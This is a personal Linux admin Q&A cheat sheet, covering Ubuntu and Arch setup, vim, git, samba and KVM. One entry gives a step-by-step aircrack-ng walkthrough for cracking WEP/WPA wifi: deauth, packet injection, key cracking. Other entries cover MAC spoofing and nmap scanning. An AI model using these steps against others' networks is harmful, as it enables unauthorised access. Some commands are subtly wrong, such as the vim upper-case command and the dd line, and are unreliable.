# Linux question & answers

question: 
- install ubuntu dose not respond
- can not install ubuntu
answer: At startup selection screen, press F6, then unselect all the fork options.

question: 
- how to modify the screen brightness
- how to change the screen brightness
- how to change the screen back light
- how to change the screen backlight
answer: xbacklight -set 40

question:
- how to over the wall by firefox
- how to over the wall with firefox
answer: |
 - sudo apt-get install openssh-server
 - Install Firefox plugin "autoproxy", the option is: "default proxy: ssh -D"
 - Goto http://www.cjb.net/cgi-bin/shell.cgi?action=signup to register a ssh account
 - ssh -v -CD 7070 username@216.194.70.6 "select yes if ask"
 - Click the "Fu" button to Green and start!

question:
- linux chinese garbled
answer: iconv -f gb2312 -t utf-8 xxx.txt> xxx.tzt

question:
- unzip garbled
answer: unzip -O CP936 xxx.zip

question:
- filename garbled
- linux filename garbled
- file name garbled
- linux file name garbled
answer: |
 - convmv -r -f utf8 -t iso88591 * --notest --nosmart
 - convmv -r -f gbk -t utf8 * --notest --nosmart

question:
- how to modify user name
- how to change user name
- how to change linux user name
answer: |
 - Edit 3 files, replace the name in the file
 - sudo vi /etc/passwd
 - sudo vi /etc/shadow
 - sudo vi /etc/group
 - Rename the home folder
 - Reboot

question:
- how to tar
- how to extract files
answer: tar jcvf filename.tar.bz2 filename

question:
- how to unzip
- how to untar
- how to unrar
- how to unextract files
answer: |
 - .tar: tar -xvf
 - .gz: gzip -d "or gunzip"
 - .tar.gz: tar -xzf
 - .tgz: tar -xzf
 - .bz2: bzip2 -d "or bunzip2"
 - .Z: uncompress
 - .tar.Z: tar -xZf
 - .rar: unrar e
 - .zip: unzip
 - .tar.bz2: tar -jxvf 
 - .7z: 7z x "must install p7zip-full"

question:
- how to config samba
- how to install samba
answer: |
 - sudo apt-get install samba smbfs
 - mkdir /home/yourname/share
 - sudo chmod 777 /home/yourname/share
 - sudo vi /etc/samba/smb.conf
   # Add this at the last of smb.conf
   [Share]
   path=/home/yourname/share
   available=yes
   browsealbe=yes
   public=yes
   writable=yes
 - sudo touch /etc/samba/smbpasswd
 - sudo smbpasswd -a username
 - sudo /etc/init.d/smbd restart
 - Test if it works: smbclient -L //localhost/share

question:
- apt-get error
- apt-get source error
- how to deal with apt-get error
answer: |
 - sudo rm -vf /var/lib/apt/lists/*
 - sudo apt-get update

question:
- how to install java
- how to build java environment
answer: |
 - sudo apt-get install openjdk-7-jdk
 - Edit .bashrc, add this
   export JAVA_HOME={your_jdk_dir}
   export JRE_HOME=${JAVA_HOME}/jre
   export CLASSPATH=:.${JAVA_HOME}/lib:${JRE_HOME}/lib
   export PATH=${JAVA_HOME}/bin:$PATH
 - At last, source .bashrc

question:
- how to add boot items on xubuntu
answer: xfce4-session-settings

question:
- filezilla can not upload
answer: |
 - Try to refresh it.
 - FTP space may be full.

question:
- how to merge audio
- how to combine audio
answer: |
 - Install ffmpeg
 - Write a list for splicing files
   file '/path/to/file1'
   file '/path/to/file2'
   file '/path/to/file3'
 - ffmpeg -f concat -i list -c copy output.mp3

question:
- ubuntu fails to start
- ubuntu can not start
answer: |
 - Enter this commands on grub
 - grub rescue> ls
 - grub rescue> ls (hd0, X)/boot/grub "if it shows something, it means that linux is installed in this partition."
 - grub rescue> set root=(hd0, X)
 - grub rescue> set prefix=(hd0, X)/boot/grub
 - grub rescue> insmod /boot/grub/normal.mod
 - grub rescue> normal
 - After enter ubuntu system, enter, 
 - sudo update-grub
 - sudo grub-install /dev/sda

question:
- how to add an environment value on ubuntu
- how to add an environment value on linux
- how to add environment value
answer: export PATH=/usr/local/arm/2.95.3/bin:$PATH

question:
- how to connect iscsi
answer: |
 - First, make sure you have open-iscsi
 - Modify /etc/iscsi/iscsid.conf
   node.startup automatic
 - Find iSCSI host "This step can be omitted"
 - Login iSCSI: sudo iscsiadm --mode discovery --type sendtargets --portal 192.168.87.125 -D --login
 - sudo fdisk -l
 - sudo mount /dev/sdb1/mnt/iscsi
 - If the disk is not formatted, 
 - sudo fdisk /dev/sdb
 - sudo mkfs.ext4 /dev/sdb1

question:
- how to shutdown ports
- how to shutdown services
answer: |
 - View open ports: nmap 127.0.0.1
 - View system services: service --status-all
 - Close Service: sudo service xxxx stop

question:
- how to turn off 631 port
answer: sudo service cups stop

question:
- how to disable boot animation
- how to close boot animation
- how to turn off boot animation
answer: |
 - Modify /etc/default/grub
   GRUB_CMDLINE_LINUX_DEFAULT = ''
 - sudo update-grub

question:
- how to connect to samba server
- how to connect to samba
answer: |
 - Linux: sudo mount -t cifs //192.168.1.7/share -o username=your_PC_name, password='xxx', iocharset=utf8 ~/share
 - Windows: \\\\IP_or_PC_name\\share

question:
- ubuntu can not shutdown
answer: |
 - Modify /etc/default/grub
   GRUB_CMDLINE_LINUX_DEFAULT="acpi=off apm power_off=1 quiet splash"
 - sudo update-grub

question:
- how to set the default browser
- how to set default browser
answer: sudo update-alternatives --config x-www-browser

question:
- how to install powertop
answer: |
 - sudo apt-get install powertop
 - edit /etc/rc.local
   powertop && 
   exit 0

question:
- how to echo numerical scale
- how to echo numerical scale on command line
- how to display numerical scale
answer: echo "scale=2;1/3"|bc

question:
- how to take mouse area screenshot
answer: scrot -s

question:
- can not open libstdc++.so.6
answer: |
 - sudo apt-get install libstdc++6
 - sudo apt-get install lib32stdc++6

question:
- how to connect wep on command line
answer: |
 - Method 1
 - iwlist wlan0
 - sudo iwconfig wlan0 essid xxx key xxx
 - sudo dhclient wlan0 or sudo dhcpcd wlan0
 - Method 2
 - sudo iw dev wlan0
 - sudo iw dev wlan0 connect xxx
 - sudo dhclient wlan0 or sudo dhcpcd wlan0
 - Note: If you set the essid iwconfig no response, sudo apt-get autoremove network-manager.

question:
- how to connect wpa on command line
answer: |
 - sudo wpa_supplicant -i wlan0 -c/etc/wpa_supplicant/wpa_supplicant.conf
 - sudo dhcpcd wlan0

question:
- how to turn off gedit automatic backup
- how to turn off gedit backup
answer: Open gedit, choose Edit->Preference->Editor, unselect "Create a backup copy of files before saving"

question:
- how to display star wars movie on command line
answer: telnet towel.blinkenlights.nl

question:
- how to save error log
answer: make>error 2>&1

question:
- how to install lamp environment
- how to install lamp
answer: |
 - sudo apt-get install apache2 php5 libapache2-mod-php5 mysql-server libapache2-mod-auth-mysql php5-mysql
 - sudo /etc/init.d/apache2 restart
 - Then enter this: sudo ls /etc/apache2/mods-enabled, see if there are php5.conf and php5.load, if not, try: sudo a2enmod php5

question:
- how to install phpmyadmin
answer: |
 - Download and unpack the phpmyadmin package.
 - sudo cp /var/www/phpmyadmin/config.sample.inc.php /var/www/phpmyadmin/config.inc.php
 - sudo vi /var/www/phpmyadmin/config.inc.php
   Find "blowfish_secret" then enter any words behind it.
 - At last install php5-mcrypt
 - sudo apt-get install php5-mcrypt
 - sudo vi /etc/php5/apache2/php.ini
 - Modify like that:
   extension php5-mcrypt.so

question:
- how to delete more than one files
- how to delete multiple files
answer: find -name "filename" -print|xargs rm

question:
- how to change mysql data to sqlite data
- how to migrate mysql data to sqlite
- how to move mysql data to sqlite
answer: |
 - First, export the data into a sql file by mysql
 - Then modified the file as follows, 
 - Remove CREATE and INSERT statements, 
 - Modify every "\'" to "''", 
 - Edit the main key to "id INTEGER PRIMARY KEY",
 - Edit the current time to "time TIMESTAMP NOT NULL DEFAULT (datetime('now','localtime'))", 
 - Edit the mysql ENUM to "CHECK(xxx IN ('A','B'))", 
 - Delete all the statements like "PRIMARY KEY ('id')", 
 - Delete all the statements like "ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT_CHARSET=utf8", 
 - At last, import this file into sqlite database.

question:
- how to use mysql
answer: |
 - Start mysql server: sudo service mysql start
 - Stop mysql server: sudo service mysql stop
 - Change passwd: mysqladmin -u username -p
 - Into a database: use db_name;
 - Add database: create database db_name;
 - Delete database: drop database db_name;
 - Input sql files: mysql < xx.sql or mysql db_name < xx.sql
 - Backup: mysqldump -u username -p db_name > filename
 - Recover: mysql -u username -p db_name < filename
 - Select the editor: pager vim

question:
- jre chinese garbled
- jre garbled
answer: http://blog.163.com/maaa_139/blog/static/31023991201051542321224/

question:
- command x86_64-linux-gnu-gcc failed with exit status 1
answer: sudo apt-get install libevent-dev

question:
- how to generate code documentation
answer: |
 - Doxygen is a document generation tool: sudo apt-get install doxygen
 - In the code directory run doxygen -g generate Doxyfile profile
 - Doxypypy is a python tool used to make doxygen better identify
 - git clone https://github.com/Feneric/doxypypy.git
 - ./setup.py build
 - sudo ./setup.py install
 - In /usr/local/bin directory py_filter create a script
   #!/bin/bash
   python -m doxypypy.doxypypy -a -c $1
 - Modify Doxyfile the FILTER_PATTERNS parameters like that: FILTER_PATTERNS *.py=py_filter
 - Graphviz is a function-graph generation tools
 - sudo apt-get install graphviz
 - Set the Doxyfile variable to YES: CLASS_DIAGRAMS, HAVE_DOT, CALL_GRAPH, CALLER_GRAPH, DOT_PATH
 - At last, run doxygen command to generate the diagram containing python code documentation
 - Notes: If the contents of the document was incomplete, please see Doxyfile the EXTRACT_ prefix argument, or set EXTRACT_ALL to YES.

question:
- how to calibrate touch screen
answer: |
 - This operation must be under the X-window environment
 - First list all input devices, to find the touch screen id: xinput list
 - Then use the following command to adjust the touch screen parameters to my CF-19 notebook parameters as an example,
   xinput set-prop 9 --type=float "Coordinate Transformation Matrix" 1.118 0 -0.09 0 1.16 -0.025 0 0 1
 - More: https://wiki.archlinux.org/index.php/Calibrating_Touchscreen

question:
- how to install festival
answer: |
 - sudo pacman festival festival-us

question:
- can not find /dev/dsp
answer: |
 - Add the following to HOME folder, save it as .festivalrc, 
   (Parameter.set 'Audio_Command' (aplay -q -c 1 -t raw -f s16 -r $SR $FILE))
   (Parameter.set 'Audio_Method' Audio_Command)

question:
- how to install wubi
answer: |
 - First install basic components: sudo pacman -S ibus ibus-table
 - Then download ibus-table-wubi source package from the Internet, we need a data file inside the Wubi
 - cd ibus-table-wubi/tables
 - ibus-table-createdb -s wubi86.txt
 - sudo cp wubi86.db /usr/share/ibus-table/tables
 - Add the environment variable to .bashrc, 
   export XMODIFIERS="@im=ibus"
   export GTK_IM_MODULE=ibus
   export QT_IM_MODULE=ibus
 - ibus-daemon -drx
 - Log off and then log back
 - After ibus-setup "terminal command" add Wubi, press Ctrl+Space to launch Wubi.

question:
- how to install xfce4
answer: |
 - sudo pacman -S xfce4
 - startxfce4

question:
- how to install x-window
answer: |
 - First install the basic components: sudo pacman -S xorg-server xorg-xinit xorg-utils xorg-server_utils mesa
 - Then install window managers and terminal: sudo pacman -S xorg-twm xterm
 - Finally, enter the original X-window by: startx

question:
- how to use mutt
- how to use mail client on terminal
answer: |
 - First, install mutt: sudo pacman -S mutt
 - Then establish .mutt folder, to store data files
 - mkdir -p ~/.mutt/cache/headers
 - mkdir ~/.mutt/cache/bodies
 - touch ~/.mutt/certificates
 - Add the following to ~/.muttrc file, modify according to their own circumstances, 
   # A basic .muttrc for use with Gmail
   set imap_user "your_email@gmail.com"
   set imap_pass "your_email_password"
   set smtp_url "smtp://your_email@smtp.gmail.com:587/"
   set smtp_pass "your_email_password"
   set from "your_email@gmail.com"
   set realname "your_name"
   set editor "vim"
   # Basic config, you can leave this as is
   set folder "imaps://imap.gmail.com:993"
   set spoolfile "+INBOX"
   set imap_check_subscribed
   set hostname gmail.com
   set mail_check 120
   set timeout 300
   set imap_keepalive 300
   set postponed "+[GMail]/Drafts"
   set record "+[GMail]/Sent Mail"
   set header_cache = ~/.mutt/cache/headers
   set message_cachedir = ~/.mutt/cache/bodies
   set certificate_file = ~/.mutt/certificates
   set move no
   set include
   set sort 'threads'
   set sort_aux 'reverse-last-date-received'
   set auto_tag yes
   ignore "Authentication-Results:"
   ignore "DomainKey-Signature:"
   ignore "DKIM-Signature:"
   hdr_order Date From To Cc
   alternative_order text/plain text/html *
   auto_view text/html
   bind editor <Tab> complete-query
   bind editor ^T complete
   bind editor <space> noop
   # Gmail-style keyboard shortcuts
   macro index,pager y "<enter-command>unset trash\n <delete-message>" "Gmail archive message"
   macro index,pager d "<enter-command>set trash=\"imaps://imap.googlemail.com/[GMail]/Bin\"\n <delete-message>" "Gmail delete message"
   macro index,pager gi "<change-folder>=INBOX<enter>" "Go to inbox"
   macro index,pager ga "<change-folder>=[Gmail]/All Mail<enter>" "Go to all mail"
   macro index,pager gs "<change-folder>=[Gmail]/Starred<enter>" "Go to starred messages"
   macro index,pager gd "<change-folder>=[Gmail]/Drafts<enter>" "Go to drafts"
 - Finally, for safety, it is need to modify the configuration file permissions: sudo chmod 600 ~/.muttrc
 - References: http: //www.cnblogs.com/wangkangluo1/archive/2012/12/28/2837300.html

question:
- how to install yaourt
answer: |
 - First add yaourt source to /etc/pacman.conf, 
   [archlinuxcn]
   #The Chinese Arch Linux communities packages.
   SigLevel Optional TrustAll
   Server http://repo.archlinuxcn.org/$arch
 - Then synchronize and install: sudo pacman -Syu yaourt

question:
- how to install sound card
- how to install sound card driver
answer: |
 - sudo pacman -S alsa-lib alsa-tools alsa-utils alsa-oss
 - Now you can use alsamixer command to adjust the volume 
 - Note: Press m is for mute

question:
- how to check battery charge
- how to check power percent
answer: |
 - sudo pacman -S acpi
 - acpi power

question:
- publickey permission deny
answer: ssh-add yourkey "Not the .pub"

question:
- how to upload the source code to github
answer: |
 - Create SSH key: ssh-keygen -C your_email_address -f ~/.ssh/id_rsa
 - Copy the SSH key to the GitHub account, as follows:
   After logging GitHub, click the button in the top right corner of the page gear set, enter account settings.
   Select SSH keys, the contents of id_rsa.pub file just copied verbatim into the generated. 
 - ssh -T git @ github.com, if successful connection, the key has been successfully imported
 - Set git initial variables, 
 - git config --global user.name your_name
 - git config --global user.email your_email_address
 - Create a new repository on GitHub
 - Enter the local source folder, proceed as follows, 
   git init
   git add *
   git commit -m "first commit"
   'git remote add origin https://github.com/your_user_name/your_repo_name.git'
   git push -u origin master
 - After that, you only need to enter, 
   git add *
   git commit
   git push

question:
- how to modify git editor
- how to change git editor
answer: git config --global core.editor vim

question:
- git can not upload
- git can not push
answer: |
 - There are 3 ways: 
 - 1.Pull before push (Adviced)
 - git pull git@github.com:aaa/bbb.git master
 - git push -u git@github.com:aaa/bbb.git master
 - 2.Force pushing (Danger)
 - git push -u git@github.com:aaa/bbb.git master -f

question:
- vim how to edit dos files
answer: :e ++ff=dos

question:
- vim how to delete the same lines
answer: :g/^\(.\+\)$\n\1/d

question:
- what is vim plugin folder mean
- what is the meaning of vim plugin folder
answer: When Vim start, it will automatically execute the plugin folder, next it will execute the ftplugin(file type plugin) folder, autoload folder is used to store big *.vim files, only execute when function calls, it is used to make vim launch faster. 

question:
- vim plug-in programming
- how to make vim plug-in
answer: |
 - First, in /etc/vimrc, "filetype plugin on" should be opened
 - Then in plugin, "au BufNewFile, BufRead, *.xxx call set filetype=AAA" to set the file type
 - When open *.xxx file, Vim will find AAA.vim and execute it.
 - In each *.vim file, function like filename#function() will call filename#function() in filename.vim
 - In plugin folder, "set syntax=BBB" will call BBB.vim in syntax folder to highlight the codes.

question:
- vim how to flip pages
answer: |
 - PageDown: Ctrl + f
 - PageUp: Ctrl + b

question:
- vim how to match chinese
answer: '[\u4e00-\u9fa5]'

question:
- vim how to match non chinese
answer: '[^"\\u4e00-\\u9fa5"]'

question:
- how to use vim historical views
- how to view vim history
answer: |
 - Back: Ctrl + o
 - Forward: Ctrl + i

question:
- how to find multiple files in vim
- vim how to find multiple files
answer: vimgrep /String/ ./*

question:
- vim how to fold the code
answer: |
 - First, add this in vimrc, 
   Set foldmethod=indent
 - Then, open the fold: l
 - Open all folds: zR
 - Close fold: zc
 - Close all folds: zM
 - Expand entire function: zO

question: 
- vim how to access system clipboard
answer: |
 - Be sure to install the vim-gnome, otherwise you can not operate the system clipboard
 - sudo apt-get install vim-gnome
 - ":reg" to see all clipboard contents in vim, the "+ is the system clipboard
 - Use command "+y to copied to the system clipboard, use command "+p to past from the system clipboard

question:
- vim can not open plug-in help documentation
answer: ':helptags ~/.vim/doc'

question:
- vim how to replace words
answer: |
 - Replace a to b: :%s/a/b/g
 - Replace a to b from line n to line m: :n,ms/a/b/g

question:
- vimwiki how to make a new line
answer: Just type <br>

question:
- how to install vimwiki
answer: |
 - Download vimwiki-xxxx.vba from http://www.vim.org/scripts/script.php?script_id=2226
 - Open vimwiki-xxxx.vba with vim
 - Use command so% to install it
 - Edit/etc/vim/vimrc, add this:
   " Vimwiki
   let g: vimwiki_camel_case 0
   let g: vimwiki_list [{
   \ 'Path': '~/vimwiki/wiki',
   \ 'Path_html': '~/vimwiki/html /',
   \}]
   set nocompatible
   filetype plugin on
   map <F5>: VimwikiAll2HTML <cr>

question:
- vim how to read binary file
answer: |
 - vi -b filename
 - :%!xxd

question:
- gvim how to init
answer: |
 - set guifont=Consolas::h12:cANSI
 - colorscheme darkblue
 - set nobackup
 - set encoding=utf-8

question:
- how to init vim
answer: |
 - nmap <C-H> <C-W>h
 - nmap <C-J> <C-W>j
 - nmap <C-K> <C-W>k
 - nmap <C-L> <C-W>l
 - set tabstop=4
 - set softtabstop=4
 - set expandtab
 - set shiftwidth=4
 - set autoindent
 - set cindent
 - set cinoptions={2,1s,t0,n-2,p2s,(03s,=.5s,>1s,=1s,:1s
 - imap kk <ESC>

question:
- how to use nmap
answer: |
 - nmap -sP 192.168.1.* Lists all online equipment segment
 - nmap -O 192.168.1.* detect operating system

question:
- how to change mac address
- how to modify mac address
answer: |
 - If your net card is eth0
 - sudo ifconfig eth0 down
 - sudo ifconfig eth0 hw ether new_mac_address
 - sudo ifconfig eth0 up

question:
- how to hack the wifi
- how to hack wifi
answer: |
 - 1. Init
 - First, turn on the wireless card, sudo ifconfig wlan0 up
 - Open the card listening mode, the number 6 is the AP's working channel, sudo airmon-ng start wlan0 6
 - Begin to crawl CAP packages, sudo airodump-ng -w filename -c 6 mon0
 - 2. Attack
 - First, use the conflict attack to active the target, sudo aireplay-ng -0 10 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (10 represents the count number of transmissions), After use airodump-ng you can see the package number increase quickly. You can active the target again and again to accelerate the package catching.
 - Second, connect the camouflage client: sudo aireplay-ng -1 0 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (0 is for delay)
 - Third, use fragmented packets attack to obtain PRGA: sudo aireplay-ng -5 -b <AP's MAC> -h <NETCARD's MAC> mon0 (it will create a .xor file at last)
 - Fourth, generate an ARP package according to the .xor file: packetforge-ng -0 -a AP's MAC -h NETCARD's MAC 5 -k 255.255.255.255 -l 255.255.255.255 -y XXXX.xor -w myarp
 - Finally, injected the ARP package to start attack: aireplay-ng -2 -r myarp -x 512 mon0 (512 is the max speed value)
 - 3. Crack
 - Crack WEP data: aircrack-ng -z -b <AP's MAC> filename *.cap
 - Crack WPA data: aircrack-ng -w password.txt -b <AP's MAC> filename *.cap

question:
- how to deal with jlink unknow device
- jlink unknow device
answer: |
 - Short connect the Erase pin and the TST pin longer.
 - It is less relationship to the order of short connection.

question:
- how to install jlink on ubuntu
answer: |
 - Warning, because of the Jlink driver auto upgradation, you must choose an old version to install, otherwise the Jlink will be broken, and you will have to reinstall the ROM!
 - First, check if the "libusb" and "libreadline" have been installed yet.
 - sudo cp -d libjlinkarm.so. */usr/lib
 - ldconfig
 - sudo cp 45-jlink.rules /etc/udev/rules.d/
 - Make sure that you are the member of group "plugdev".
 - Reboot the computer.
 - Run the file "start".
 - If there's an error like  _error libreadline.so.5 can not open shared object file_, try this, 
 - Install the getlibs, sudo dpkg -i --force-all getlibs-all.deb
 - Use getlibs to install the readline library, getlibs libreadline.so.5
 - At last, make a link of libreadline.so.5 to into/lib

question:
- how to install sdcc on ubuntu
- how to install sdcc
answer: |
 - sudo apt-get install sdcc
 - If it does not work, try this: sudo apt-get install gputils gputils-common gputils-doc sdcc sdcc-doc sdcc-libraries sdcc-ucsim

question:
- cmu sphinx can not find libpocketsphinx.so.1
answer: 
 - sudo apt-get install audacity
 - libpocketsphinx.so.1 problem will arise when you start pocketsphinx_continues. It mainly due to that sphinxbase did not be added to the library path environment variable
 - So we do: sudo vi/etc/ld.so.conf
 - Add this, 
   /Usr/local/lib
   /Usr/local/lib/pkgconfig
 - Then, sudo ldconfig

question:
- cmu sphinx failed to open audio device
- pocketsphinx_continues failed to open audio device
answer: sudo apt-get install pulseaudio

question:
- cmu sphinx failed to calibrate voice activity detection
- pocketsphinx_cintinues failed to calibrate voice activity detection
answer: wake up the computer

question:
- cmu sphinx pycapsule_getpointer called with invalid pycapsule object
answer: install the new version, upper than 5prealpha

question:
- python undefined symbol ps_update_lmset
answer: |
 - sudo easy_install -m sphinxbase
 - sudo easy_install -m pocketsphinx

question:
- expreval error when build coreseek
answer: |
 - Edit sphinxexpr.cpp, line 1010, 1044, 1077, change T val ExprEval (this-> m_pArg, tMatch); to T val this-> ExprEval (this-> m_pArg, tMatch);
 - Note: the config file of sphinx does not support ~/but support/home/user

question:
- how to install xml.vim
answer: |
 - Copy xml.vim file to ~/.vim/ftplugin and then use ln -s command to create relationship between xml.vim and docbk.vim, xsl.vim, html.vim, xhtml.vim
 - Open ftplugin in vimrc
 - Tips, 
 - Tag autocomplete: double-click > symbol
 - Auto new line: double-click ; symbol in INSERT mod
 - For more help, enter: help xml-plugin

question:
- bochs dlopen failed for module x file not found
answer: sudo apt-get install bochs-x

question:
- libbx_x.so undefined symbol xpmcreatepixmapfromdata
answer: added, display_library; sdl in bochsrc

question:
- bochs error
answer: |
 - If an error of bochsrc occured, the normal way is just comment the error line.
 - bochsrc use double quotes, not single quotes.
 - Use bximage to make image
 - sudo kpartx -a xxx.img mount the image
 - sudo kpartx -d xxx.img unmount the image

question:
- how to mount qcow2
- how to mount qcow2 image
answer: |
 - modprobe nbd max_part=63
 - qemu-nbd -c /dev/nbd0 image.img
 - mount /dev/nbd0p1 /mnt/image

question:
- ubuntu how to install ftp server
- linux how to install ftp server
answer: sudo apt-get install pure-ftpd

question:
- git how to revert
answer: git revert HEAD

question:
- sqlite can not import data from text
- sqlite can not import text
answer: Change text to sql file, then import.

question:
- how to replace string in multiple files
- how to replace text in multiple files
- how to replace in multiple files
answer: sed -i 's/oldString/newString/g' `grep oldString -rl ./`

question:
- kvm how to use snapshot
answer: |
 - Create snapshot: qemu-img snapshot -c snapshot_name image.qcow2
 - Show all the snapshot: qemu-img snapshot -l image.qcow2
 - Revert snapshot: qemu-img snapshot -a snapshot_name image.qcow2
 - Delete snapshot: qemu-img snapshot -d snapshot_name image.qcow2

question:
- how to use lftp
answer: |
 - Login: lftp name@site:port
 - Command: ls, cd, get, put, mirror -R

question:
- ubuntu how to sudo when boot up
answer: Just write sudo in /etc/rc.local, cause rc.local is executed by root.

question:
- openwrt how to install ftp server
- how to install ftp server on openwrt
answer: |
 - opkg update
 - opkg install vsftpd

question:
- pico cms can not open sub page
answer: |
 - Make sure the .htaccess file is in the main folder.
 - sudo vi /etc/apache2/apache2.conf, change "AllowOverride None" to "AllowOverride FileInfo Options"

question:
- kvm how to create image
- how to create kvm image
answer: sudo qemu-img create -f qcow2  image.img 60G

question:
- how to install kvm
answer: sudo apt-get install qemu-kvm virt-manager bridge-utils libvirt-bin

question:
- how to install vnc server
answer: |
 - sudo apt-get install vnc4server
 - vncpasswd
 - sudo apt-get install xfce4
 - vi ~/.vnc/xstartup, annotate the old config, add new config, 
   #x-terminal-emulator -geometry 80x24+10+10 -ls -title "$VNCDESKTOP Desktop" & 
   #x-window-manager & 
   sesion-manager & xfdesktop & xfce4-panel & 
   xfce4-menu-plugin & 
   xfsettingsd & 
   xfconfd & 
   xfwm4 & 
 - Start server: vncserver :1
 - Stop server: vncserver -kill :1

question:
- how to wake up remote pc
- how to wake up remote computer
answer: wakeonlan -i ip_address mac_address

question:
- how to mount raw
- how to mount raw image
answer: |
 - sudo fdisk -lu image.raw, find the first start number n,
 - echo $((n*512)), get N,
 - sudo mount -o loop,offset=N image.raw folder/

question:
- can not use tab on terminal
- can not use tab on command line
- terminal can not use tab
- command line can not use tab
answer: |
 - vi ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml
 - Change line <property name="<Super>Tab" type="string" value="switch_window_key"/> to <property name="<Super>Tab" type="empty"/>
 - sudo reboot

question:
- vim how to save word in regular expression
- vim how to save words in regular expression
- vim how to save string in regular expression
answer: :%s/\(str_1\) xxx \(str_2\)/\2 or \1/

question:
- vim how to remove duplicate rows
- vim how to delete duplicate rows
answer: |
 - :sort
 - :g/^\(.*\)$\n\1$/d

question:
- vim how to mismatch
answer: '[^(your_regex)]'

question:
- vim how to convert case
- vim how to change case
answer: |
 - Enter the code directly
 - All change to lower case: ggguG
 - All change to upper case: ggguG

question:
- how to install vim-markdown
answer: |
 - Download and unzip vim-markdown
 - Edit /etc/vimrc, add, 
   set noncompatible
   filetype plugin on

question:
- ubuntu how to remove encryption
- ubuntu how to remove main folder encryption
answer: |
 - First, backup: sudo cp -rp /home/your_name /home/your_name.bk
 - Then, reboot and login by root
 - rm -rf /home/your_name
 - mv /home/your_name.bk /home/your_name
 - rm -rf /home/.ecryptfs
 - rm -rf /home/your_name/.ecryptfs
 - rm -rf /home/your_name/.Private
 - apt-get autoremove ecryptfs-utils libecryptfs0

question:
- how to redirect the domain to github pages
- how to redirect domain to github
answer: |
 - Add CNAME file in github main folder, the context is the domain.
 - Then, the domain, add the github A Record,  
   192.30.252.153
   192.30.252.154

question:
- chrome how to install flash
- ubuntu how to install chrome flash plugin
- chrome how to install flash plugin on ubuntu
answer: |
 - sudo apt-get install pepperflashplugin-nonfree
 - sudo update-pepperflashplugin-nonfree --install

question:
- firefox how to install flash
- ubuntu how to install firefox flash plugin
- firefox how to install flash plugin on ubuntu
answer: sudo apt-get install flashplugin-nonfree

question:
- ubuntu how to rm to trash
answer: |
 - sudo apt-get install trash-cli
 - Edit /usr/local/bin/trash-rm, 
   #!/bin/bash
   # command name: trash-rm
   shopt -s extglob
   recursive=1
   declare -a cmd
   ((i = 0))
   for f in "$@"
   do
   case "$f" in
   (-*([fiIv])r*([fiIv])|-*([fiIv])R*([fiIv]))
   tmp="${f//[rR]/}"
   if [ -n "$tmp" ]
   then
   #echo "\$tmp == $tmp"
   cmd[$i]="$tmp"
   ((i++))
   fi
   recursive=0 ;;
   (--recursive) recursive=0 ;;
   (*)
   if [ $recursive != 0   -a  -d "$f" ]
   then
   echo "skipping directory: $f"
   continue
   else
   cmd[$i]="$f"
   ((i++))
   fi ;;
   esac
   done
   trash-put "${cmd[@]}"
 - sudo chmod +x /usr/local/bin/trash-rm
 - Finally, add 'alias rm="trash-rm"' to ~/.bashrc
 - source ~/.bashrc

question:
- can not find cdrom when install ubuntu
answer: |
 - First, enter the command line when install
 - Second, mount the U-disk
 - Third, cd into U-disk then mount ubuntu.iso to /cdrom
 - At last, exit and continue install.

question:
- kvm vnc can not connect
answer: |
 - Edit the domain file of the virtual machine, modify 127.0.0.1 to 0.0.0.0, like that, 
   <graphics type='vnc' port='-1' autoport='yes' listen='0.0.0.0'>
   <listen type='address' address='0.0.0.0'/>
   </graphics>

question:
- kvm how to clone
- how to clone kvm image
answer: virt-clone -o {old_kvm_name} -n {new_kvm_name} -f {new_kvm_image_address}

question:
- how to change terminal language
- how to modify terminal language
answer: |
 - Edit /etc/default/locale, 
   LANG="en_US.UTF-8"
   LANGUAGE="en_US:en"
 - Reboot.

question:
- vim how to paste
answer: |
 - :set paste
 - :set nopaste

question:
- php can not write files
answer: chmod

question:
- how to transfer files through ssh
- how to transfer files by cifs
answer: sudo mount -t cifs //ip_address/folder -o username=xxx,password='xxx',iocharset=utf8 ~/folder

question:
- git how to check the difference
- git how to diff
answer: |
 - git diff (tree vs index)
 - git diff -cached (index vs commit)
 - git diff HEAD (tree vs commit)

question:
- python how to install tkinter
answer: sudo apt install python3-tk

question:
- ubuntu how to make system disk
- linux how to make system disk
answer: sudo dd if=system.iso, of=/dev/sdc

question:
- centos can not connect to network
answer: |
 - vi /etc/sysconfig/network-scripts/ifcfg-eth0
 - /etc/init.d/network restart

question:
- vim how to change case
answer: |
 - :%s/\(xxx\)/\L\1/g (Lower)
 - :%s/\(xxx\)/\U\1/g (Upper)

